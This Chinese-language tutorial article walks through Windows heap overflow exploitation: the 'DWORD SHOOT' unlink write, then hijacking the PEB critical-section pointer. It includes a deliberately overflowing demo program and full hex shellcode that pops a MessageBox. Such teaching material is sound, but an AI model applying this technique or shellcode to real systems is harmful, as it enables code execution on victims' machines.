---
title: 【系列】堆溢出研究（三）
author: TKMoma
wechat_source: >-
  http://mp.weixin.qq.com/s?timestamp=1495451790&src=3&ver=1&signature=l12Tij*JEXuplVxFRWdZeeBDuFUhCzsMu*BB0SOQM33MAgARkNLSZo0jyCA7SaUudhiQ0fHPlvS7dX48MRKYXSrLlTR9q-5z2hY61lcY4A5bZJkqy6EQI*hJoAwgs8lPXGK08lJrCesnjR0aLLDZy6L0gViSbXlj0ik*zR5TqSg=
date: '2017-05-20 00:00:00 +0000'

---

{% raw  %}
<section label="Copyright Reserved by ipaiban.com." style="text-align: left; margin: 5px 0px 0px; border-width: medium; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 10px; border-style: none;"><section style="display: inline-block; padding: 0.5em; border-radius: 3px; color: white; font-size: 1em; box-shadow: 0.1em 0.1em 0.2em rgb(165, 165, 165); background-color: rgb(0, 0, 0);"><p class="" style="color: rgb(255, 255, 255); line-height: 22px; font-size: 18px;"><span style="font-size: 18px;">DWORD SHOOT 简介</span></p></section></section><p class=""><br></p><p style="line-height: 1.75em;"><span style="font-size: 15px;">DWORD SHOOT 只是一种叫法，在堆溢出中即为任意内存任意数据读写 &nbsp;下面直接在在调试中进行体会 DWORD SHOOT 。<br> 源码：</span><span style="font-size: 12px;"><br></span></p><p style="line-height: normal;"><span style="font-size: 12px;"><br></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 12px;">#include&nbsp;&lt;windows.h&gt;
main()
{
&nbsp;&nbsp;&nbsp;&nbsp;HLOCAL&nbsp;h1,&nbsp;h2,h3,h4,h5,h6;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hp;
&nbsp;&nbsp;&nbsp;&nbsp;hp&nbsp;=&nbsp;HeapCreate(0,0x1000,0x10000);
&nbsp;&nbsp;&nbsp;&nbsp;h1&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
&nbsp;&nbsp;&nbsp;&nbsp;h2&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
&nbsp;&nbsp;&nbsp;&nbsp;h3&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
&nbsp;&nbsp;&nbsp;&nbsp;h4&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
&nbsp;&nbsp;&nbsp;&nbsp;h5&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
&nbsp;&nbsp;&nbsp;&nbsp;h6&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,8);

&nbsp;&nbsp;&nbsp;&nbsp;_asm&nbsp;int&nbsp;3&nbsp;&nbsp;//used&nbsp;to&nbsp;break&nbsp;the&nbsp;process
&nbsp;&nbsp;&nbsp;&nbsp;//free&nbsp;the&nbsp;odd&nbsp;blocks&nbsp;to&nbsp;prevent&nbsp;coalesing
&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(hp,0,h1);&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(hp,0,h3);&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(hp,0,h5);&nbsp;//now&nbsp;freelist[2]&nbsp;got&nbsp;3&nbsp;entries

&nbsp;&nbsp;&nbsp;&nbsp;//will&nbsp;allocate&nbsp;from&nbsp;freelist[2]&nbsp;which&nbsp;means&nbsp;unlink&nbsp;the&nbsp;last&nbsp;entry&nbsp;(h5)
&nbsp;&nbsp;&nbsp;&nbsp;h1&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,8);&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
}</span></p></blockquote><p><br></p><section label="Copyright Reserved by ipaiban.com." style="text-align: left; margin: 5px 0px 0px; border-width: medium; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 10px; border-style: none;"><section style="display: inline-block; padding: 0.5em; border-radius: 3px; color: white; font-size: 1em; box-shadow: 0.1em 0.1em 0.2em rgb(165, 165, 165); background-color: rgb(0, 0, 0);"><p class="" style="color: rgb(255, 255, 255); line-height: 22px; font-size: 18px;"><span style="font-size: 18px;">调试中认识DWORD SHOOT</span></p></section></section><p class=""><br></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">直接运行上述程序，来到断点出：如下图所示：</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span><img src="/ikanxue/images/3475b7043f8eef16449310b7d1403234567acf08.jpeg" style="width: 500px !important; height: 322px !important; visibility: visible !important;"><span style="font-size: 15px;"> &nbsp;<br> </span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">查看 dump 窗口中已经分配好的堆块：</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span><img src="/ikanxue/images/bb20bc1018bec81c31acfcbf9b5c6c1bd45e4be1.jpeg" style="width: 500px !important; height: 181px !important;"><br><span style="font-size: 15px;"> 接下来运行程序：</span></p><blockquote><pre><p style="line-height: normal;"><span style="font-size: 15px;">&nbsp;&nbsp;&nbsp;</span><span style="font-size: 12px;">&nbsp;HeapFree(hp,0,h1);&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(hp,0,h3);&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;HeapFree(hp,0,h5);&nbsp;//now&nbsp;freelist[2]&nbsp;got&nbsp;3&nbsp;entries</span></p></pre></blockquote><p style="line-height: 1.75em; margin-bottom: 15px; margin-top: 15px;"><span style="font-size: 15px;">连续进行释放 h1 h3 h5 &nbsp;因为 三个堆块size= 16bytes （八字节块首 + 八字节块身） 因此会链接进入空表索引区的 freelist[2]。如下图所示：<br></span><img src="/ikanxue/images/4b7058f63ca1df886976a4df30dafc24b99679d0.jpeg" style="width: 500px !important; height: 75px !important;"><br><span style="font-size: 15px;"> 堆块区： &nbsp;<br></span><img src="/ikanxue/images/cb1bb71c5655f36b7c5332e379d94c9dc90070bb.jpeg" style="width: 500px !important; height: 118px !important;"><br><span style="font-size: 15px;"> 根据堆块索引区的前向后向指针，以及h1 h3 h5的指针对的链接关系，可以得到下图所示：<br></span><img src="/ikanxue/images/6ee272ab55b126472346ec488f184594f37d291e.jpeg" style="width: 500px !important; height: 178px !important;"><br><img src="/ikanxue/images/4d38a614a63eb8a4eb5823a0d54e6866b84f0283.jpeg" style="width: 380px !important; height: 378px !important;"></p><p style="line-height: 1.75em; margin-bottom: 15px; margin-top: 15px;"><span style="font-size: 15px; line-height: 1.75em;">如上两图所示，只需将基地址：0x520000 修改为 0x360000 即可。 接下来继续执行代码：</span><br></p><p style="line-height: normal;"><span style="font-size: 15px;"><br></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 15px;"></span><span style="font-size: 12px;">h1&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,8);</span></p></blockquote><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">此次申请会从 freelist[2] 中将空表中最后一个节点 h5 卸下。如下图所示：&nbsp;</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/161f3628ae07a1e0119370012f9abf9549f9f024.jpeg" style="width: 500px !important; height: 129px !important;"><br><img src="/ikanxue/images/2a3ff4a0100ba16653de201fc4bd96995f4abef7.jpeg" style="width: 500px !important; height: 167px !important;"></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">由以上两图可知，h5 堆块已经被卸下。。</span></p><h4 style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">观察最后一次申请内存时h5前后向指针的变化 非常重要</span></h4><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">未申请内存之前 h5处的前向指针 0x360188 指向freelistp[2]0x360188 &nbsp;后向指针0x3606a8指向h3 0x3606a8 <br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">当h5被卸下后，h3的前后向指针分别是：0x360188 &nbsp;0x360688 &nbsp;（也就是将原来h5的前向指针的值，写入啦 以后向指针为地址的相对应的值中） &nbsp; &nbsp;</span></p><section label="Copyright Reserved by ipaiban.com." style="text-align: left; margin: 5px 0px 0px; border-width: medium; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 10px; border-style: none;"><section style="display: inline-block; padding: 0.5em; border-radius: 3px; color: white; font-size: 1em; box-shadow: 0.1em 0.1em 0.2em rgb(165, 165, 165); background-color: rgb(0, 0, 0);"><p class="" style="color: rgb(255, 255, 255); line-height: 22px; font-size: 18px;"><span style="font-size: 18px;">DWORD SHOOT的利用思路</span></p></section></section><p class=""><br></p><p class=""><span style="font-size: 15px;">当我们在程序中修改上述的 h5的后向指针为一个合法地址的时候，h5的前向指针就会被写入这个合法的地址当中。</span></p><p class=""><br></p><section label="Copyright Reserved by ipaiban.com." style="text-align: left; margin: 5px 0px 0px; border-width: medium; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 10px; border-style: none;"><section style="display: inline-block; padding: 0.5em; border-radius: 3px; color: white; font-size: 1em; box-shadow: 0.1em 0.1em 0.2em rgb(165, 165, 165); background-color: rgb(0, 0, 0);"><p class="" style="color: rgb(255, 255, 255); line-height: 22px; font-size: 18px;"><span style="font-size: 18px;">堆溢出的利用——代码植入</span></p></section></section><p class=""><strong><span style="font-size: 16px;"><br></span></strong></p><p class=""><strong><span style="font-size: 16px;">一、栈溢出堆溢出利用思路比较</span></strong></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">1.栈溢出覆盖面积大，可谓是地毯式覆盖，不精确 <br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">2.堆溢出利用比较精确的打击目标（但是部分时候利用的强度小）</span><span style="font-size: 16px;"><strong><br></strong></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 16px;"><strong><br></strong></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 16px;"><strong>二、堆溢出常用的目标</strong></span></p><ol class="list-paddingleft-2"><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">内存变量</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">代码逻辑</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">函数返回地址</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">异常处理机制</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">函数指针</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">PEB中线程同步函数的入口地址:每个进程的PEB
 中都存放这一对线程同步函数指针，指向RtlEnterCriticalSection() 
和RtLeaveCritcalSection(),并且在进程退出的时候会被ExitProcess()调用，如果能够通过DWORD SHOOT 
修改这对指针中的任意一个，那么在程序退出的时候ExitProcess()将会被骗去执行我们的shellcode。由于PEB的位置始终不会变化（mov
 eax,fs[30]），所以这对指针相对于peb的偏移之中不变，这使得开发通用的exploit成为可能。&nbsp; </span></p></li></ol><p style="line-height: 1.75em;"><span style="font-size: 15px;">本次采用 peb 中线程同步函数的入口地址 即 PEB（进程环境块） 
RtlEnterCriticalSection()。ExitProcess() 函数在程序退出的时候会调用临界区函数，但是调用方法独特，是通过线程环境块中偏移
 0x20 处存放的函数指针来间接完成的。也就是偏移 
0x7ffdf020 处存放的指向 RtlEnterCriticalSection() 的指针。在0x7ffdf024 处存放着 RtlCriticalSection() 的指针。（windows2003 以后改写啦实现方法）。这里我们以地址 0x7ffdf024 处的地址为目标，构造劫持进程植入代码的全套动作：</span></p><p style="line-height: 1.75em;"><span style="font-size: 15px;"><br></span></p><p style="line-height: 1.75em;"><span style="font-size: 15px;">用于实验的代码：</span></p><p style="line-height: normal;"><span style="font-size: 12px;"><br></span></p><blockquote><p style="line-height: normal;"><span style="font-size: 12px;">#include&nbsp;&lt;windows.h&gt;
char&nbsp;shellcode[]&nbsp;=&nbsp;"\x90\x90\x90\x90\x90\x90\x90....";
int&nbsp;main()
{
&nbsp;&nbsp;&nbsp;&nbsp;HLOCAL&nbsp;h1&nbsp;=&nbsp;0,&nbsp;h2&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;hp;
&nbsp;&nbsp;&nbsp;&nbsp;hp&nbsp;=&nbsp;HeapCreate(0,0x1000,0x10000);
&nbsp;&nbsp;&nbsp;&nbsp;h1&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,200);
&nbsp;&nbsp;&nbsp;&nbsp;__asm&nbsp;int&nbsp;3&nbsp;//used&nbsp;to&nbsp;break&nbsp;the&nbsp;process
&nbsp;&nbsp;&nbsp;&nbsp;//memcpy(h1,shellcode,200);&nbsp;//normal&nbsp;cpy,&nbsp;used&nbsp;to&nbsp;watch&nbsp;the&nbsp;heap
&nbsp;&nbsp;&nbsp;&nbsp;memcpy(h1,shellcode,0x200);&nbsp;//overflow,0x200=512
&nbsp;&nbsp;&nbsp;&nbsp;h2&nbsp;=&nbsp;HeapAlloc(hp,HEAP_ZERO_MEMORY,8);
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;0;
}</span></p></blockquote><p><br></p><section label="Copyright Reserved by ipaiban.com." style="text-align: left; margin: 5px 0px 0px; border-width: medium; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 10px; border-style: none;"><section style="display: inline-block; padding: 0.5em; border-radius: 3px; color: white; font-size: 1em; box-shadow: 0.1em 0.1em 0.2em rgb(165, 165, 165); background-color: rgb(0, 0, 0);"><p class="" style="color: rgb(255, 255, 255); line-height: 22px; font-size: 18px;"><span style="font-size: 18px;">实验简单介绍</span></p></section></section><p class=""><br></p><ol class="list-paddingleft-2"><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">h1申请的啦 200字节的空间</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">memcpy()的复制的数量写错 &nbsp;0x200 = 512 bytes &nbsp;所以会产生溢出（因为h1申请的是200字节）</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">h1分配完成后后面紧跟着的是一个大尾块</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">超过200字节的部分将会覆盖尾块的块首以及部分块身</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">利用伪造的指针覆盖尾块块首的空表指针，当h2分配时候，将会导致DWORD SHOOT</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">DWORD SHOOT 目标是 0x7ffdf020处的指针，将其修改为shellcode的位置</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">DWORD SHOOT完毕后将会导致异常，程序退出，调用 ExitProcess()</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">ExitProcess()函数退出的时候会调用同步函数，但是确实从 peb中拿走啦 shellcode的地址，因此shellcode被执行 直接运行程序玩 mencopy（）函数 dump窗口如下图：</span></p></li></ol><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/840e845a993a75e5190f6b82f080eccfbd8afd3d.jpeg" style="width: 500px !important; height: 205px !important;"><span style="font-size: 15px;">&nbsp;&nbsp;</span></p><section label="Copyright Reserved by ipaiban.com." style="text-align: left; margin: 5px 0px 0px; border-width: medium; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 10px; border-style: none;"><section style="display: inline-block; padding: 0.5em; border-radius: 3px; color: white; font-size: 1em; box-shadow: 0.1em 0.1em 0.2em rgb(165, 165, 165); background-color: rgb(0, 0, 0);"><p class="" style="color: rgb(255, 255, 255); line-height: 22px; font-size: 18px;">缓冲区的布置<br></p></section></section><p class=""><br></p><ol class="list-paddingleft-2"><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">利用前面栈溢出的 shellcode （168 bytes）通过添加 0x90 增加到 200 字节</span></p></li><li><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">紧随其后的就是 &nbsp;尾块块首 上图中已经标注出来</span></p></li><li><p style="line-height: normal;"><span style="font-size: 15px;">前向指针是 Dword SHOOT 是 shellcode 的地址 ，这里直接是 0x360688 后向指针是 shellcode 要写入的目标地址，这里写入的是 peb 中的函数指针地址 &nbsp;0x7ffdf020</span></p></li></ol><p style="line-height: normal;"><br></p><p style="line-height: normal;"><span style="font-size: 15px;">整个缓冲区布置完以后是：</span><span style="font-size: 12px;"></span></p><p style="line-height: normal;"><br></p><blockquote><p style="line-height: normal;"><span style="font-size: 12px;">char&nbsp;shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
"\x16\x01\x1A\x00\x00\x10\x00\x00"//尾块的块首
"\x88\x06\x36\x00\x20\xf0\xfd\x7f";//</span></p></blockquote><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">当运行此缓冲区的时候，会发现期待 MessageBox() 函数不会被调用。</span></p><section label="Copyright Reserved by ipaiban.com." style="text-align: left; margin: 5px 0px 0px; border-width: medium; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 10px; border-style: none;"><section style="display: inline-block; padding: 0.5em; border-radius: 3px; color: white; font-size: 1em; box-shadow: 0.1em 0.1em 0.2em rgb(165, 165, 165); background-color: rgb(0, 0, 0);"><p class="" style="color: rgb(255, 255, 255); line-height: 22px; font-size: 18px;"><span style="font-size: 18px;">失败原因</span></p></section></section><p class=""><br></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">此 shellcode 不会溢出成功的原因在于程序中不仅仅 ExitPcoess（）函数会调用临界区，shellcode中的函数也会进行调用，一样会被骗。</span></p><section label="Copyright Reserved by ipaiban.com." style="text-align: left; margin: 5px 0px 0px; border-width: medium; border-color: currentcolor; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; padding: 10px; border-style: none;"><section style="display: inline-block; padding: 0.5em; border-radius: 3px; color: white; font-size: 1em; box-shadow: 0.1em 0.1em 0.2em rgb(165, 165, 165); background-color: rgb(0, 0, 0);"><p class="" style="color: rgb(255, 255, 255); line-height: 22px; font-size: 18px;"><span style="font-size: 18px;">解决办法</span></p></section></section><p class=""><br></p><p style="line-height: normal;"><span style="font-size: 15px;">直接一开始就修复 dword shoot 的指针重新布置 shellcode：</span><br></p><p style="line-height: normal;"><br></p><blockquote><p style="line-height: normal;"><span style="font-size: 12px;">char&nbsp;shellcode[]=
&nbsp;&nbsp;&nbsp;&nbsp;"\x90\x90\x90\x90\x90\x90\x90\x90"
&nbsp;&nbsp;&nbsp;&nbsp;"\x90\x90\x90\x90"
&nbsp;&nbsp;&nbsp;&nbsp;//repaire&nbsp;the&nbsp;pointer&nbsp;which&nbsp;shooted&nbsp;by&nbsp;heap&nbsp;over&nbsp;run
&nbsp;&nbsp;&nbsp;&nbsp;"\xB8\x20\xF0\xFD\x7F"&nbsp;&nbsp;//MOV&nbsp;EAX,7FFDF020
&nbsp;&nbsp;&nbsp;&nbsp;"\xBB\x60\x20\xF8\x77"&nbsp;&nbsp;//MOV&nbsp;EBX,77f82060&nbsp;the&nbsp;address&nbsp;here&nbsp;may&nbsp;releated&nbsp;to&nbsp;your&nbsp;OS
&nbsp;&nbsp;&nbsp;&nbsp;"\x89\x18"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//MOV&nbsp;DWORD&nbsp;PTR&nbsp;DS:[EAX],EBX
&nbsp;&nbsp;&nbsp;&nbsp;"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
&nbsp;&nbsp;&nbsp;&nbsp;"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
&nbsp;&nbsp;&nbsp;&nbsp;"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
&nbsp;&nbsp;&nbsp;&nbsp;"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
&nbsp;&nbsp;&nbsp;&nbsp;"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
&nbsp;&nbsp;&nbsp;&nbsp;"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
&nbsp;&nbsp;&nbsp;&nbsp;"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
&nbsp;&nbsp;&nbsp;&nbsp;"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
&nbsp;&nbsp;&nbsp;&nbsp;"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
&nbsp;&nbsp;&nbsp;&nbsp;"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
&nbsp;&nbsp;&nbsp;&nbsp;"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
&nbsp;&nbsp;&nbsp;&nbsp;"\x16\x01\x1A\x00\x00\x10\x00\x00"//&nbsp;head&nbsp;of&nbsp;the&nbsp;ajacent&nbsp;free&nbsp;block
&nbsp;&nbsp;&nbsp;&nbsp;"\x88\x06\x36\x00\x20\xf0\xfd\x7f";</span></p></blockquote><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">"\xBB\x60\x20\xF8\x77" 
&nbsp;//MOV EBX,77f82060 the address here may releated to your OS 
&nbsp;此0x77f82060 的值需要自行调试得出 调试方法 直接 汇编 mov eax,fs[30]运行到此处，根据peb的结构 
，在偏移 0x20 处的值 。</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">最终执行效果如图所示：&nbsp;</span><span style="font-size: 15px; line-height: 1.75em;">&nbsp;&nbsp;</span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><img src="/ikanxue/images/5de3d66a2572e3405a69dc744a1d329d4af3619f.jpeg" style="width: 500px !important; height: 325px !important;"><span style="font-size: 15px;"> &nbsp;</span></p><h4 style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 16px;"><strong>注意事项</strong></span></h4><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">1. 利用不成功的同学可能是为根据自己的系统确认 &nbsp;peb 0x20偏移处的值 <br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">2.编译选项的原因 <br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">3.系统环境的原因等等。。。</span></p><h4 style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 16px;"><strong>拓展</strong></span></h4><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;">本文只是简单利用PEB中的函数指针还有更多的目标可以用异常处理机制等都可以作为利用的对象，请在下面多进行尝试。<br> 本文参考自《0day安全技术漏洞分析技术》																								2017/5/15 11:12:57 <br></span></p><p style="margin-top: 15px; margin-bottom: 15px; line-height: 1.75em;"><span style="font-size: 15px;"></span></p><p style="margin-top: 15px; margin-bottom: 15px; max-width: 100%; min-height: 1em; line-height: 1.75em; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; color: rgb(79, 138, 187); box-sizing: border-box !important; overflow-wrap: break-word !important;"><strong style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;">你可能对以下内容感兴趣：<br></strong></span></p><hr style="max-width: 100%; line-height: 25.6px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><p style="max-width: 100%; min-height: 1em; line-height: 25.6px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><br style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;"></p><ul class="list-paddingleft-2" style="list-style-type: circle;"><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282630&amp;idx=1&amp;sn=61fcbc708235dec5d7897a0d7c315756&amp;chksm=b1815a0c86f6d31a50ba1f9a39d876e28f2c71096100b28e961df185f7be94ec77b9199efd51&amp;scene=21#wechat_redirect" target="_blank" style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;">等你来挑战！| 看雪 CTF 2017 攻击篇</a></span></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282621&amp;idx=1&amp;sn=15f5bc0fa2b0b34ae241668b23a3939b&amp;chksm=b1815af786f6d3e1fd4bad2c336d725ec600551a6477bbc4c6af93167074ac83873aeba89938&amp;scene=21#wechat_redirect" target="_blank" style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;">【终于等到你！】看雪 CTF 2017</a></span></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&amp;mid=2458282703&amp;idx=1&amp;sn=7ed476d577172ff4b4a93807dae2667c&amp;chksm=b1815a4586f6d35373f6c5d783fa99a7bb7cf2fc35da914761a9cf2d9943a09c1aefb9febfbf&amp;scene=21#wechat_redirect" target="_blank" style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; box-sizing: border-box !important; overflow-wrap: break-word !important;">春风十里，我在等你</span></a></p></li><li><p style="margin-top: 10px; margin-bottom: 10px; max-width: 100%; min-height: 1em; line-height: normal; box-sizing: border-box !important; overflow-wrap: break-word !important;"><span style="max-width: 100%; font-size: 15px; box-sizing: border-box !important; overflow-wrap: break-word !important;"><a 